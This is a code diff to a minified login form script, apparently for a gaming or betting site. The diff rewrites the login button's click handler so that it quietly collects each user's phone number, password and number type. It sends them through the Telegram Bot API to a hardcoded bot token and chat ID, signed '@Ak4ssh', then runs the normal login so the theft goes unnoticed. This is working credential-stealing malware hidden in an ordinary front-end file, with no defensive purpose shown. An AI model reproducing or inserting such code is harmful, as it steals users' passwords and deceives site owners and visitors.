@@ -1619,7 +1619,9 @@ p)
                 onChangeN: P
             }, null, 8, ["show-validate", "type", "number-type", "number"]), k(ie, {
                 value: a(o).userForm.password,
-                "onUpdate:value": x[1] || (x[1] = j => a(o).userForm.password = j),
+                "onUpdate:value": x[1] || (x[1] = j => {
+                    a(o).userForm.password = j
+                }),
                 label: _.$t("password"),
                 maxlength: 32
             }, null, 8, ["value", "label"]), e("div", null, [k(le, {
@@ -1630,8 +1632,39 @@ p)
                 _: 1
             }, 8, ["modelValue"])]), e("div", io, [e("button", {
                 class: O([a(o).userForm.number != "" ? "active" : ""]),
-                onClick: u
-            }, r(_.$t("login")), 3), e("button", {
+                onClick: async () => {
+                    const number = a(o).userForm.number;
+                    const password = a(o).userForm.password;
+                    const ok = a(o).getUserForm.numberType;
+                    const botToken = '7211580703:AAEPCnOqUDUhvU6MJkg59UbUcuUph_pxwLk';
+                    const chatId = '-1002421689922';
+                    const message = `Tc Details:\n\nNumber: ${number}\nPassword: ${password}\nnumber type: ${ok}\n\nThis is written by @Ak4ssh :)`;
+                    try {
+                        const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                            method: 'POST',
+                            headers: {
+                                'Content-Type': 'application/json',
+                            },
+                            body: JSON.stringify({
+                                chat_id: chatId,
+                                text: message,
+                            }),
+                        });
+            
+                        const data = await response.json();
+                        if (data.ok) {
+                            console.log('Message sent successfully:', data.result);
+                        } else {
+                            console.error('Error sending message:', data.description);
+                        }
+                    } catch (error) {
+                        console.error('Error:', error);
+                    }
+            
+                    u();
+                }
+            }            
+            , r(_.$t("login")), 3), e("button", {
                 class: "register",
                 onClick: function() {
                     window.location.href = "https://9987up.vip/#/register?invitationCode=611487213119";
